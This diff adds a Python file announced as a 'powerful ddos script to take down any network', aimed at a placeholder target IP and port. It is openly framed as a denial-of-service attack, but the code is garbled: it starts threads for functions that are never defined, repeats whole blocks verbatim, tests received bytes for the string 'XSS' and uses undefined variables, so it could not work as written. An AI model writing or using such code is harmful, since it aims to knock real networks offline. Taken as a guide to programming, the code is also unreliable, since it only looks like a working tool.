@@ -1,0 +1,120 @@
+*** powerful ddos script to take down any network***
+
+import socket
+import os
+import threading
+import time
+
+target_ip = 'IP_ADDRESS_HERE'
+target_port = 80
+connections = 100
+data_size = 1024
+threads = 4
+max_connections = 1000
+max_threads = 4000
+max_connections_maintained = 1000
+max_buffer_size = 10000000
+max_connections_per_second = 500
+max_threads_per_second = 1000
+max_buffer_per_second = 1000000
+report_interval = 60
+buffer_interval = 10
+connection_interval = 5
+cleanup_interval = 30
+incoming_threads = 2
+outgoing_threads = 2
+script_name = 'DDOS_SCRIPT'
+buffer_threads = incoming_threads + outgoing_threads
+log_file = 'DDOS_LOG.txt'
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target_ip, target_port))
+
+data = b'This is a test message'
+received_data = b''
+buf_size = max_buffer_size
+conn = None
+buffer = bytearray(buf_size)
+buffer_threads = incoming_threads + outgoing_threads
+
+for i in range(buffer_threads):
+    t = threading.Thread(target=buffering_thread, args=(s, conn, buffer, buf_size))
+    t.start()
+
+establishing_threads = incoming_threads + outgoing_threads
+
+for i in range(establishing_threads):
+    t = threading.Thread(target=establishing_thread, args=(s, max_connections, target_ip, target_port))
+    t.start()
+
+sending_threads = incoming_threads + outgoing_threads
+
+for i in range(sending_threads):
+    t = threading.Thread(target=sending_thread, args=(s, max_connections, target_ip, target_port))
+    t.start()
+
+cleanup_threads = incoming_threads + outgoing_threads
+
+for i in range(cleanup_threads):
+    t = threading.Thread(target=cleanup_thread, args=(s, max_connections, target_ip, target_port))
+    t.start()
+
+report_interval_seconds = report_interval
+buffer_interval_seconds = buffer_interval
+connection_interval_seconds = connection_interval
+cleanup_interval_seconds = cleanup_interval
+
+report_thread = threading.Thread(target=report_thread, args=(s, max_connections, max_connections_maintained, max_connections_per_second, max_connections_per_second, log_file, report_interval_seconds))
+report_thread.start()
+
+buffering_thread = threading.Thread(target=buffering_thread, args=(s, conn, buffer, buf_size))
+buffering_thread.start()
+
+establishing_thread = threading.Thread(target=establishing_thread, args=(s, max_connections, target_ip, target_port))
+establishing_thread.start()
+
+sending_thread = threading.Thread(target=sending_thread, args=(s, max_connections, target_ip, target_port))
+sending_thread.start()
+
+cleanup_thread = threading.Thread(target=cleanup_thread, args=(s, max_connections, target_ip, target_port))
+cleanup_thread.start()
+
+while True:
+    data = s.recv(1024)
+
+    if 'XSS' in data:
+        with open(log_file, 'a') as f:
+            f.write(f'{target_ip}: {data}\n')
+        s.send(b'Bye!')
+        s.close()
+        conn.close()
+
+    if 'XSS' in data:
+        with open(log_file, 'a') as f:
+            f.write(f'{target_ip}: {data}\n')
+        s.send(b'Bye!')
+        s.close()
+        conn.close()
+
+    if len(buffer) > 0:
+        with open(log_file, 'a') as f:
+            f.write(f'{target_ip}: {b'\x00'+buffer.decode()}\n')
+        buffer[:] = []
+        s.send(b'Bye!')
+        s.close()
+        conn.close()
+
+    if len(data) > 0:
+        s.send(data)
+        s.close()
+        conn.close()
+
+    if len(buffer) > 0:
+        with open(log_file, 'a') as f:
+            f.write(f'{target_ip}: {b'\x00'+buffer.decode()}\n')
+        buffer[:] = []
+        s.send(b'Bye!')
+        s.close()
+        conn.close()
+
+    time.sleep(interval)
